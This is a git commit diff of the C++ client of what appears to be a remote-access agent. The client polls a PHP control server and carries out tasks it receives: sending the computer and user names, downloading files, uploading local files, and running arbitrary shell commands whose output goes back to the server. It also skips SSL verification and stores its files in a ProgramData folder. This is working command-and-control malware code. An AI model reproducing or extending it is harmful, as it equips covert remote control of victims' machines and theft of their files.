8f4e76e5426d1b80ee4ca3ddec65de2815663255
freedman1002 <allahoakbar1002@gmail.com>
2017-07-03 17:22:34 +0430

    t

--- Client/main.cpp
+++ Client/main.cpp
@@ -10,6 +10,7 @@
 #include <chrono>
 #include <ctime>
 #include <stdexcept>
+#include <fcntl.h>
 
 #include "libcurl/include/curl/curl.h"
 
@@ -20,7 +21,6 @@
 #else
 #pragma comment(lib, "libcurl/lib/libcurl_a32.lib")
 #endif
-
 
 
 
@@ -46,12 +46,12 @@ typedef std::wstring String;
 #define TASK_INVALID -1
 #define TASK_UNKNOWN 0
 #define TASK_DONE 1
-#define TASK_INIT "INIT"									//INIT;id=46;alive_delay_minutes=5;
-#define TASK_SEND_COMPUTERNAME "SEND_COMPUTERNAME"			//SEND_COMPUTERNAME;
-#define TASK_SEND_USERNAME "SEND_USERNAME"					//SEND_USERNAME
-#define TASK_GET_FILE "GET_FILE"							//GET_FILE;url=http://cbdkj;path=C:/ProgramData/lklsd
-#define TASK_SEND_FILE "SEND_FILE"							//SEND_FILE;url=http://cbdkj;path=C:/ProgramData/lklsd
-#define TASK_RUN_COMMAND "RUN_COMMAND"						//RUN_COMMAND;rugviortum
+#define TASK_INIT "INIT"									//n=52;INIT;id=46;alive_delay_minutes=5;
+#define TASK_SEND_COMPUTERNAME "SEND_COMPUTERNAME"			//n=xx;SEND_COMPUTERNAME;
+#define TASK_SEND_USERNAME "SEND_USERNAME"					//n=xx;SEND_USERNAME;
+#define TASK_GET_FILE "GET_FILE"							//n=xx;GET_FILE;url=http://cbdkj;path=C:/ProgramData/lklsd;
+#define TASK_SEND_FILE "SEND_FILE"							//n=xx;SEND_FILE;url=http://cbdkj;path=C:/ProgramData/lklsd;
+#define TASK_RUN_COMMAND "RUN_COMMAND"						//n=xx;RUN_COMMAND;rugviortum;
 
 #define MAX_SEMAPHORE_COUNT 1
 
@@ -70,6 +70,10 @@ class AClass {
  }
  */
 
+/*
+char *s0 is the same as char s1[] but you must dont change s0[i] but you can safely change s1[i] 
+so use const char *
+*/
 
 
  //#define MODE_SPLIT  //split large conections
@@ -87,11 +91,12 @@ HANDLE semaphore_checkresult;
 DWORD dwWaitResult;
 bool alive = TRUE;
 int block_size_m = 1;
-char *server_url = "http://127.0.0.1/Project2_agent/first.php";
+const char *server_url = "http://localhost/Project2_agent/first.php";
 //char *server_url = "http://127.0.0.1:6789/id=0";
 //char *server_url = "http://192.168.1.148/Project2_agent/first.php";
-char *client_id = "0";
-char *serverurl_clientid="http://192.168.1.148/Project2_agent/first.php?id=2";
+char client_id[6] = "0";
+char commandNumber[6] = "0";
+char serverurl_clientid[100] ="http://192.168.1.148/Project2_agent/first.php?id=2?n=0";
 int alive_delay_min = 2;
 CURL *curl_mainhandler;
 
@@ -104,18 +109,27 @@ string exec(const char* cmd);
 void add_id_to_url() {
 	
 	char *temp = "?id=";
-	serverurl_clientid = (char *)malloc(1 + strlen(server_url) + strlen(temp) + strlen(client_id));
+	char *temp2 = "&n=";
+	//serverurl_clientid = (char *)malloc(1 + strlen(server_url) + 4/*strlen(temp)*/ + 5/*max strlen(client_id)*/ + 3/*strlen(temp2)*/ + 5/*max strlen(commandNumber)*/);
 	strcpy(serverurl_clientid, server_url);
 	strcat(serverurl_clientid, temp);
 	strcat(serverurl_clientid, client_id);
+	strcat(serverurl_clientid, temp2);
+	strcat(serverurl_clientid, commandNumber);
 	
 }
 
 #pragma region curl
-void forbid_reuse_connection(CURL *curl_mainhandler, bool forbid) {
-	if (curl_mainhandler) {
-		curl_easy_setopt(curl_mainhandler, CURLOPT_FORBID_REUSE, forbid);
+void forbid_reuse_connection(CURL *curl_handler, bool forbid) {
+	if (curl_handler) {
+		curl_easy_setopt(curl_handler, CURLOPT_FORBID_REUSE, forbid);
 	}
+}
+void curl_reset(CURL *curl_handler) {
+
+	curl_easy_reset(curl_handler);
+
+	forbid_reuse_connection(curl_handler, TRUE);
 }
 
 CURLcode modify_headers(CURL *curl_mainhandler) {
@@ -158,7 +172,7 @@ size_t read_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
 
 	if (size*nmemb < 1)
 		return 0;
-
+	
 	size_t read = fread(ptr, size, nmemb, stream);
 	return read;
 }
@@ -194,6 +208,8 @@ size_t write_data_charstar(void *ptr, size_t size, size_t nmemb, struct url_data
 
 CURLcode get_skipssl(CURL *curl_handler, char *url, char download_filename[]) {
 
+	curl_reset(curl_handler);
+
 	curl_easy_setopt(curl_mainhandler, CURLOPT_URL, url);
 	//skip ssl cetification
 	curl_easy_setopt(curl_mainhandler, CURLOPT_SSL_VERIFYPEER, FALSE);
@@ -215,37 +231,54 @@ CURLcode get_skipssl(CURL *curl_handler, char *url, char download_filename[]) {
 	return res;
 }
 
-CURLcode post_file(CURL *curl_handler, char *url, char upload_filename[]) {
+CURLcode post_file(CURL *curl_handler, char *url, char *upload_filename) {
+	
+	curl_reset(curl_handler);
+
 	struct url_data data;
 	data.size = 0;
-	data.data = (char *)malloc(1024); /* reasonable size initial buffer */
+	data.data = (char *)malloc(1024); // reasonable size initial buffer 
 	if (NULL == data.data) {
 		fprintf(stderr, "Failed to allocate memory.\n");
 		//error
 	}
 	data.data[0] = '\0';
 	//save response in data.data
-	curl_easy_setopt(curl_mainhandler, CURLOPT_WRITEFUNCTION, write_data_charstar);
-	curl_easy_setopt(curl_mainhandler, CURLOPT_WRITEDATA, &data);
-
-	curl_easy_setopt(curl_mainhandler, CURLOPT_URL, url);
-	curl_easy_setopt(curl_mainhandler, CURLOPT_POST, 1L);
-
-	FILE *fpin = fopen(upload_filename, "rb");
-	curl_easy_setopt(curl_mainhandler, CURLOPT_READFUNCTION, read_data);
-	curl_easy_setopt(curl_mainhandler, CURLOPT_READDATA, fpin);
-
+	curl_easy_setopt(curl_handler, CURLOPT_WRITEFUNCTION, write_data_charstar);
+	curl_easy_setopt(curl_handler, CURLOPT_WRITEDATA, &data);
 	
-	CURLcode res = curl_easy_perform(curl_mainhandler); /* post away! */
+	
+	FILE *fpin = fopen(upload_filename, "rb");
+	fseek(fpin, 0L, SEEK_END);
+	size_t sz = ftell(fpin);
+	fseek(fpin, 0L, SEEK_SET);
+
+	curl_easy_setopt(curl_handler, CURLOPT_URL, url);
+	curl_easy_setopt(curl_handler, CURLOPT_UPLOAD, 1L);
+	curl_easy_setopt(curl_handler, CURLOPT_POST, 1L);
+	curl_easy_setopt(curl_handler, CURLOPT_POSTFIELDS, NULL);
+	curl_easy_setopt(curl_handler, CURLOPT_READFUNCTION, read_data);
+	curl_easy_setopt(curl_handler, CURLOPT_READDATA, fpin);
+	
+	struct stat file_info;
+	fstat(_fileno(fpin), &file_info);
+	curl_easy_setopt(curl_handler, CURLOPT_INFILESIZE_LARGE,(curl_off_t)file_info.st_size);
+
+	CURLcode res = curl_easy_perform(curl_handler);
+	
 	if(fpin != NULL)
 		fclose(fpin);
-
+	
 	freeMallocedMemory(data.data);
 
 	return res;
 }
+
+
 CURLcode post_control_synchronous(CURL *curl_handler, char *url, char *post_data, char result_filename[]) {
 	WaitForSingleObject(semaphore_resultfile, INFINITE);
+
+	curl_reset(curl_handler);
 
 	curl_easy_setopt(curl_mainhandler, CURLOPT_URL, url);
 	curl_easy_setopt(curl_mainhandler, CURLOPT_POSTFIELDS, post_data);
@@ -264,6 +297,9 @@ CURLcode post_control_synchronous(CURL *curl_handler, char *url, char *post_data
 	return res;
 }
 CURLcode post_data(CURL *curl_handler, char *url, char *post_data) {
+
+	curl_reset(curl_handler);
+
 	struct url_data data;
 	data.size = 0;
 	data.data = (char *)malloc(1024); /* reasonable size initial buffer */
@@ -280,7 +316,7 @@ CURLcode post_data(CURL *curl_handler, char *url, char *post_data) {
 	curl_easy_setopt(curl_mainhandler, CURLOPT_POSTFIELDS, post_data);
 	curl_easy_setopt(curl_mainhandler, CURLOPT_POSTFIELDSIZE, (long)strlen(post_data));
 	
-	CURLcode res = curl_easy_perform(curl_mainhandler); /* post away! */
+	CURLcode res = curl_easy_perform(curl_handler); /* post away! */
 
 	freeMallocedMemory(data.data);
 	return res;
@@ -327,7 +363,7 @@ void read_init(char init_filename[]) {
 	if (!getline(infile, line)) {
 		return;
 	}
-
+	
 	start = 0;
 	end = line.find(";");
 	str = line.substr(start, end);
@@ -340,15 +376,16 @@ void read_init(char init_filename[]) {
 	//sample: id=1616;
 	start = line.find("=");
 	end = line.find(";");
-	str = line.substr(start+1, end - start);
-	client_id = string_to_charstar(str);
+	
+	str = line.substr(start+1, end - start -1);
+	strcpy(client_id, string_to_charstar(str));
 	add_id_to_url();
 
 	line = line.substr(end + 1);
 	//sample alive_delay_miniutes=5;
 	start = line.find("=");
 	end = line.find(";");
-	str = line.substr(start+1, end - start);
+	str = line.substr(start+1, end - start -1);
 	alive_delay_min = stoi(str, nullptr);
 
 	//...
@@ -365,17 +402,23 @@ void client_init(char init_filename[])
 	ifstream infile;
 	infile.open(init_filename);
 	//check if file exists and no error in stream
-	if (!infile.good()) {
-		infile.close();
-		post_control_synchronous(curl_mainhandler, serverurl_clientid, init, init_filename);
-		read_init(init_filename);
+	try {
+		if (!infile.good()) {
+			infile.close();
+			post_control_synchronous(curl_mainhandler, serverurl_clientid, init, init_filename);
+			read_init(init_filename);
+		}
+		else {
+			infile.close();
+			read_init(init_filename);
+			remove(init_filename);
+			post_control_synchronous(curl_mainhandler, serverurl_clientid, init, init_filename);
+			read_init(init_filename);
+		}
 	}
-	else {
-		infile.close();
-		read_init(init_filename);
-		remove(init_filename);
-		post_control_synchronous(curl_mainhandler, serverurl_clientid, init, init_filename);
-		read_init(init_filename);
+	catch (...) {
+		// Catch all exceptions – dangerous!!!
+
 	}
 }
 
@@ -387,6 +430,7 @@ void add_header_file(string header_data, char in_filename[])
 
 void check_tasks(char result_filename[]) {
 	
+
 	ifstream infile;
 	WaitForSingleObject(semaphore_resultfile, INFINITE);
 	infile.open(result_filename);
@@ -394,6 +438,9 @@ void check_tasks(char result_filename[]) {
 	bool task_done = FALSE;
 	int task = TASK_UNKNOWN;
 	while (getline(infile, line)) {
+
+		
+
 		infile.close();
 		ReleaseSemaphore(semaphore_resultfile, 1, NULL);
 
@@ -403,8 +450,10 @@ void check_tasks(char result_filename[]) {
 		catch (...) {
 			// Catch all exceptions – dangerous!!!
 			task = TASK_INVALID;
+			
 		}
 		if (task == TASK_INVALID) {
+			
 			delete_done_task_synchronous(result_filename);
 			string tmp = POST_FAILED;
 			tmp += ";";
@@ -460,17 +509,31 @@ void getAndSend_username() {
 }
 
 int task_do(string line, char result_filename[]){
-	//cout << line;
+	
 
-	if (line.length() < 1)
+	if (line.length() < 1) {
 		return TASK_INVALID;
+	}
 	size_t start;
 	size_t end;
 	string str;
 	string str2;
-	//sample: id=1616;
+
+	//cout << line << "\n";
+
+	start = line.find("=");
+	end = line.find(";");
+	str = line.substr(start+1, end - start -1);
+	strcpy(commandNumber, string_to_charstar(str));
+	
+	add_id_to_url();
+	line = line.substr(end + 1);
+
+	//sample: GET_FILE;
+	
 	end = line.find(";");
 	str = line.substr(0, end);
+	line = line.substr(end + 1);
 	if (str.compare(TASK_SEND_COMPUTERNAME) == 0) {
 
 		getAndSend_computername();
@@ -479,33 +542,33 @@ int task_do(string line, char result_filename[]){
 		getAndSend_username();
 	}
 	else if (str.compare(TASK_SEND_FILE) == 0) {
-		line = line.substr(end +1);
 
 		start = line.find("=");
 		end = line.find(";");
-		str = line.substr(start+1, end - start);
+		str = line.substr(start+1, end - start -1);
 
 		line = line.substr(end + 1);
 		start = line.find("=");
 		end = line.find(";");
-		str2 = line.substr(start+1, end - start);
+		str2 = line.substr(start+1, end - start -1);
 
 		char * url = string_to_charstar(str);
 		char * path = string_to_charstar(str2);
 
 		post_file(curl_mainhandler, url, path);
+		//cout << url <<"\n"<< path << "\ndone";
 
 	}
 	else if (str.compare(TASK_GET_FILE) == 0) {
-		line = line.substr(end + 1);
+		
 		start = line.find("=");
 		end = line.find(";");
-		str = line.substr(start+1, end - start);
+		str = line.substr(start+1, end - start -1);
 
 		line = line.substr(end + 1);
 		start = line.find("=");
 		end = line.find(";");
-		str2 = line.substr(start+1, end - start);
+		str2 = line.substr(start+1, end - start -1);
 
 		char * url = string_to_charstar(str);
 		char * path = string_to_charstar(str2);
@@ -519,7 +582,9 @@ int task_do(string line, char result_filename[]){
 		
 	}
 	else if (str.compare(TASK_RUN_COMMAND) == 0) {
-		line = line.substr(end + 1);
+		
+		end = line.find(";");
+		line = line.substr(0, end);
 		//system(string_to_charstar(line));
 		char *cmd = string_to_charstar(line);
 		char *output = string_to_charstar(exec(cmd));
@@ -599,22 +664,6 @@ string exec(const char* cmd) {
 #endif
 {
 
-//#define _TEST
-#ifdef _TEST
-		CURL *curl_handlerm;
-		curl_handlerm = curl_easy_init();
-		char *server_url2 = "http://192.168.1.148";
-		char *data = POST_INIT;
-		char result_filename2[FILENAME_MAX] = "C:/ProgramData/tempo/results.txt";
-		forbid_reuse_connection(curl_handlerm, TRUE);
-		//post_control_synchronous(curl_handlerm, server_url2, POST_INIT, result_filename2);
-		//cout << "\nend.";
-		_getch();
-		return 0;
-#endif
-
-
-
 	
 	//make a sub folder
 	char outDir[FILENAME_MAX] = "C:/ProgramData/tempo";
@@ -659,11 +708,18 @@ string exec(const char* cmd) {
 	*/
 
 	add_id_to_url();
+
+	curl_mainhandler = curl_easy_init();
+
+	//#define _TEST
+#ifdef _TEST
+	post_file(curl_mainhandler, "http://localhost/Project2_agent/first.php?id=3&n=2", "E:/ali.mp3");
+	_getch();
+	return 0;
+#endif
 	
 	thread thread_alive(thread_alive_run,
 										serverurl_clientid, result_filename, alive_delay_min);
-
-	curl_mainhandler = curl_easy_init();
 
 	if (curl_mainhandler) {
 
